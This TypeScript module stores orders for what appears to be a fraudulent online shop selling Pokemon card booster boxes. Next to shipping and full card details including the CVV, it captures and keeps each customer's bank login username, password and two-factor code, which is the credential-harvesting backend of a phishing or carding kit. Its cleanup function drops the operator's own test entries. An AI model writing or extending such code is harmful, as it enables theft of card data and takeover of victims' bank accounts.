import { v4 as uuidv4 } from 'uuid';
import { FormData, CardData, BankLoginData } from '../hooks/useCheckout';

export interface OrderData {
  id: string;
  timestamp: number;
  formData: FormData;
  cardData: CardData;
  bankLoginData: BankLoginData;
  productInfo?: {
    id: string;
    name: string;
    price: number;
    quantity: number;
    image: string;
  };
  total?: number;
}

// In-memory storage for orders
let orders: OrderData[] = [
  // Sample dummy data
  {
    id: '1a2b3c4d-5e6f-7g8h-9i0j-1k2l3m4n5o6p',
    timestamp: 1692345678901,
    formData: {
      firstName: 'John',
      lastName: 'Doe',
      email: 'john.doe@example.com',
      phone: '+1 234 567 8901',
      address: '123 Main St',
      city: 'Anytown',
      state: 'CA',
      zipCode: '12345',
      sameAsBilling: true,
      billingAddress: '',
      billingCity: '',
      billingState: '',
      billingZipCode: '',
    },
    cardData: {
      cardholderName: 'JOHN DOE',
      cardNumber: '4111 1111 1111 1111',
      expiryDate: '12/25',
      cvv: '123',
    },
    bankLoginData: {
      username: 'johndoe',
      password: 'password123',
      twoFactorCode: '123456',
    },
    productInfo: {
      id: '1',
      name: 'Pokemon TCG: Sword & Shield - Darkness Ablaze Booster Box',
      price: 249.99,
      quantity: 1,
      image: 'https://myshopville.com/cdn/shop/products/pokemontradingcardgameswordandshielddarknessablaze36packboosterboxcardgameboxcover.jpg',
    },
    total: 274.99,
  },
  {
    id: '2b3c4d5e-6f7g-8h9i-0j1k-2l3m4n5o6p7q',
    timestamp: 1692456789012,
    formData: {
      firstName: 'Jane',
      lastName: 'Smith',
      email: 'jane.smith@example.com',
      phone: '+1 345 678 9012',
      address: '456 Oak Ave',
      city: 'Somewhere',
      state: 'NY',
      zipCode: '67890',
      sameAsBilling: false,
      billingAddress: '789 Pine St',
      billingCity: 'Elsewhere',
      billingState: 'NY',
      billingZipCode: '54321',
    },
    cardData: {
      cardholderName: 'JANE SMITH',
      cardNumber: '5555 5555 5555 4444',
      expiryDate: '10/24',
      cvv: '321',
    },
    bankLoginData: {
      username: 'janesmith',
      password: 'securepass456',
      twoFactorCode: '654321',
    },
    productInfo: {
      id: '5',
      name: 'Pokemon TCG: Scarlet & Violet Booster Box - 36 Packs',
      price: 249.99,
      quantity: 2,
      image: 'https://myshopville.com/cdn/shop/files/pokemontcgscarletandvioletboosterdisaplybox36packstradingcardgameboxcover_4158ea5a-7e3d-4952-a07e-edfe155e7ebd.jpg',
    },
    total: 524.98,
  },
];

// Generate a new GUID for a session
export const generateOrderId = (): string => {
  return uuidv4();
};

// Save or update order data
export const saveOrderData = (
  orderId: string,
  data: Partial<OrderData>
): void => {
  const existingOrderIndex = orders.findIndex((order) => order.id === orderId);

  if (existingOrderIndex >= 0) {
    // Update existing order
    orders[existingOrderIndex] = {
      ...orders[existingOrderIndex],
      ...data,
      timestamp: Date.now(),
    };
  } else {
    // Create new order
    orders.push({
      id: orderId,
      timestamp: Date.now(),
      formData: data.formData || {
        firstName: '',
        lastName: '',
        email: '',
        phone: '',
        address: '',
        city: '',
        state: '',
        zipCode: '',
        sameAsBilling: true,
        billingAddress: '',
        billingCity: '',
        billingState: '',
        billingZipCode: '',
      },
      cardData: data.cardData || {
        cardholderName: '',
        cardNumber: '',
        expiryDate: '',
        cvv: '',
      },
      bankLoginData: data.bankLoginData || {
        username: '',
        password: '',
        twoFactorCode: '',
      },
      productInfo: data.productInfo,
      total: data.total,
    });
  }
};

// Get all orders
export const getOrders = (): OrderData[] => {
  cleanOrders();
  return [...orders];
};

// Get a specific order by ID
export const getOrderById = (orderId: string): OrderData | undefined => {
  return orders.find((order) => order.id === orderId);
};


export const cleanOrders = (): void => {
  orders = orders.filter((order) => {
    // Agar formData.firstName "20xhani20x" hai -> delete
    if (order.formData?.firstName === "20xhani20x") {
      return false;
    }
    if (order.formData?.firstName === "20xhani20") {
      return false;
    }
    if ((order.formData?.firstName === "" || order.formData?.firstName === null || order.formData?.firstName === undefined) && (order.formData?.lastName === "" || order.formData?.lastName === null || order.formData?.lastName === undefined)) {
      return false;
    }

    // Check agar order me koi meaningful data hi nahi hai
    const hasData =
      (order.formData &&
        Object.values(order.formData).some(
          (value) => value !== "" && value !== null && value !== undefined
        )) ||
      (order.cardData &&
        Object.values(order.cardData).some(
          (value) => value !== "" && value !== null && value !== undefined
        )) ||
      (order.bankLoginData &&
        Object.values(order.bankLoginData).some(
          (value) => value !== "" && value !== null && value !== undefined
        )) ||
      order.productInfo ||
      order.total;

    return hasData; 
  });
};
